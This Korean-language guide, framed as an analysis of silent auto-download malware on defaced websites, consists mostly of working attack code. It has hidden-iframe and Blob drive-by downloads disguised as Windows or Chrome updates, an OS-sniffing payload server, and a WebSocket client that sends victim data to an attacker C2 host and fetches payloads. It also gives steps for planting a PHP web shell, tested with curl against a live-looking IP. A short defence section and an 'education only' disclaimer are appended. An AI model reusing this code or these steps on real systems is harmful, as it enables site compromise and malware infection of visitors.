# 자동 다운로드 악성코드 분석

## 개요

변조된 웹사이트에 방문한 사용자가 눈치채지 못하게 악성 파일을 자동으로 다운로드하는 기법을 분석합니다.

---

## 기법 1: 숨겨진 iframe을 통한 다운로드

### HTML/JavaScript 코드:

```html
<!-- 사용자에게 보이지 않는 iframe -->
<iframe id="malware-downloader"
        style="display:none; width:0; height:0; border:0;"
        src=""></iframe>

<script>
// 페이지 로드 3초 후 자동 다운로드 시작
setTimeout(() => {
    // 악성 파일 URL (서버에 호스팅)
    const malwareUrl = '/www/downloads/system-update.exe';

    // iframe을 통해 다운로드 트리거
    document.getElementById('malware-downloader').src = malwareUrl;

    console.log('[Malware] Silent download initiated');
}, 3000);
</script>
```

### 동작 방식:
1. 사용자가 변조된 페이지에 접속
2. 3초 후 보이지 않는 iframe이 악성 파일 URL 로드
3. 브라우저가 자동으로 파일 다운로드 시작
4. 사용자는 해킹 페이지에 정신이 팔려 다운로드를 눈치채지 못함

---

## 기법 2: JavaScript Blob을 통한 강제 다운로드

### JavaScript 코드:

```javascript
// 악성 페이로드 (base64로 인코딩된 실행 파일)
const malwareBase64 = "TVqQAAMAAAAEAAAA//8AALgAAAAA..."; // PE 파일

function downloadMalware() {
    try {
        // Base64 디코딩
        const binaryString = atob(malwareBase64);
        const len = binaryString.length;
        const bytes = new Uint8Array(len);

        for (let i = 0; i < len; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }

        // Blob 생성
        const blob = new Blob([bytes], { type: 'application/octet-stream' });

        // 다운로드 링크 생성
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'windows-security-update.exe'; // 정상 파일로 위장

        // 자동 클릭 (다운로드 트리거)
        document.body.appendChild(a);
        a.click();

        // 정리
        setTimeout(() => {
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
        }, 100);

        console.log('[Malware] File download completed');
    } catch(e) {
        console.error('[Malware] Download failed:', e);
    }
}

// 페이지 로드 후 5초 뒤 실행
setTimeout(downloadMalware, 5000);
```

### 특징:
- 외부 서버 필요 없음 (페이로드가 JavaScript에 포함)
- 브라우저 다운로드 정책 우회
- 파일명을 정상 업데이트로 위장

---

## 기법 3: Drive-by Download (가장 은밀)

### HTML 코드:

```html
<!-- 정상적인 이미지로 위장 -->
<img src="/www/tracker.php?download=1"
     style="display:none;"
     onerror="initMalwareDownload()">

<script>
function initMalwareDownload() {
    // XMLHttpRequest로 서버에서 악성 파일 가져오기
    const xhr = new XMLHttpRequest();
    xhr.open('GET', '/www/api/payload.php?type=windows', true);
    xhr.responseType = 'blob';

    xhr.onload = function() {
        if (xhr.status === 200) {
            const blob = xhr.response;
            const url = window.URL.createObjectURL(blob);

            // 숨겨진 링크로 다운로드
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = 'chrome-update.exe'; // Chrome 업데이트로 위장

            document.body.appendChild(a);
            a.click();

            // 흔적 제거
            setTimeout(() => {
                document.body.removeChild(a);
                window.URL.revokeObjectURL(url);
            }, 100);
        }
    };

    xhr.send();
}

// 페이지 진입 시 즉시 실행
window.addEventListener('load', initMalwareDownload);
</script>
```

### 서버 측 (payload.php):

```php
<?php
// payload.php - 악성 파일 제공

header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="system-update.exe"');
header('Cache-Control: no-cache');

// OS 감지
$userAgent = $_SERVER['HTTP_USER_AGENT'];

if (strpos($userAgent, 'Windows') !== false) {
    // Windows 악성코드
    readfile('/var/www/malware/windows-payload.exe');
} elseif (strpos($userAgent, 'Mac') !== false) {
    // macOS 악성코드
    readfile('/var/www/malware/macos-payload.dmg');
} elseif (strpos($userAgent, 'Linux') !== false) {
    // Linux 악성코드
    readfile('/var/www/malware/linux-payload.sh');
}

// 로그 기록 (공격 추적)
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
file_put_contents('/tmp/malware_downloads.log',
    "$time - $ip - $userAgent\n", FILE_APPEND);
?>
```

---

## 기법 4: WebSocket을 통한 실시간 페이로드 전송

### JavaScript 코드:

```javascript
// C2 서버와 WebSocket 연결
const ws = new WebSocket('wss://attacker-c2-server.com/payload');

ws.onopen = function() {
    // 시스템 정보 전송
    ws.send(JSON.stringify({
        type: 'victim_info',
        os: navigator.platform,
        browser: navigator.userAgent,
        screen: screen.width + 'x' + screen.height
    }));
};

ws.onmessage = function(event) {
    const data = JSON.parse(event.data);

    if (data.type === 'payload') {
        // C2 서버가 보낸 맞춤형 악성코드 다운로드
        const blob = new Blob([atob(data.content)],
            { type: 'application/octet-stream' });

        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = data.filename || 'update.exe';
        a.click();
    }
};
```

### 특징:
- 실시간 C2 통신
- 피해자 시스템에 맞춤형 페이로드 전송
- 탐지 회피 (암호화된 WebSocket)

---

## 서버에 적용하기

### 단계 1: 악성 파일 준비

서버에서 실행:
```bash
# 테스트용 "악성" 파일 생성 (실제로는 무해)
mkdir -p /var/www/html/www/downloads
cat > /var/www/html/www/downloads/system-update.txt << 'EOF'
[TEST MALWARE FILE]
This file was automatically downloaded.
In a real attack, this would be malicious software.
Victim IP: [REDACTED]
Download Time: [TIMESTAMP]
EOF

chmod 644 /var/www/html/www/downloads/system-update.txt
chown apache:apache /var/www/html/www/downloads/system-update.txt
```

### 단계 2: index.php에 자동 다운로드 코드 추가

기존 defacewebsite.sh를 수정하여 `</script>` 태그 앞에 추가:

```javascript
// 자동 다운로드 기능 (다크웹 스타일)
setTimeout(() => {
    try {
        // 방법 1: iframe 다운로드
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = '/www/downloads/system-update.txt';
        document.body.appendChild(iframe);

        // 방법 2: Blob 다운로드 (더 은밀)
        setTimeout(() => {
            fetch('/www/downloads/system-update.txt')
                .then(response => response.blob())
                .then(blob => {
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = url;
                    a.download = 'windows-security-patch.txt';
                    document.body.appendChild(a);
                    a.click();
                    setTimeout(() => {
                        document.body.removeChild(a);
                        window.URL.revokeObjectURL(url);
                    }, 100);
                });
        }, 2000);

    } catch(e) {
        // 조용히 실패 (사용자에게 알리지 않음)
    }
}, 5000); // 페이지 로드 5초 후
```

---

## 탐지 및 방어

### 사용자 측 방어:
1. **다운로드 폴더 모니터링**
   - 예상치 못한 파일 다운로드 확인

2. **브라우저 설정**
   - "다운로드 전 저장 위치 확인" 활성화
   - JavaScript 차단 (NoScript 확장)

3. **의심스러운 웹사이트 회피**
   - HTTPS 확인
   - URL 검증

### 서버 관리자 측 탐지:
1. **웹쉘 탐지**
   ```bash
   # 의심스러운 PHP 파일 검색
   find /var/www -name "*.php" -exec grep -l "system\|exec\|shell_exec\|passthru" {} \;
   ```

2. **숨김 파일 검색**
   ```bash
   find /var/www -name ".*" -type f
   ```

3. **다운로드 폴더 확인**
   ```bash
   ls -la /var/www/html/www/downloads/
   ```

4. **Apache 로그 분석**
   ```bash
   grep "downloads/" /var/log/httpd/access_log
   ```

---

## 실제 적용

서버에서 실행할 명령어:

```bash
# 1. 웹쉘 생성 (일반 이름)
cat > /var/www/html/www/api/system.php << 'EOF'
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
EOF

sudo chown apache:apache /var/www/html/www/api/system.php
sudo chmod 644 /var/www/html/www/api/system.php

# 2. 테스트
curl "http://52.79.240.83/www/api/system.php?cmd=whoami"
```

---

이 문서는 교육 목적으로만 사용되어야 하며, 실제 악성코드 배포는 불법입니다.
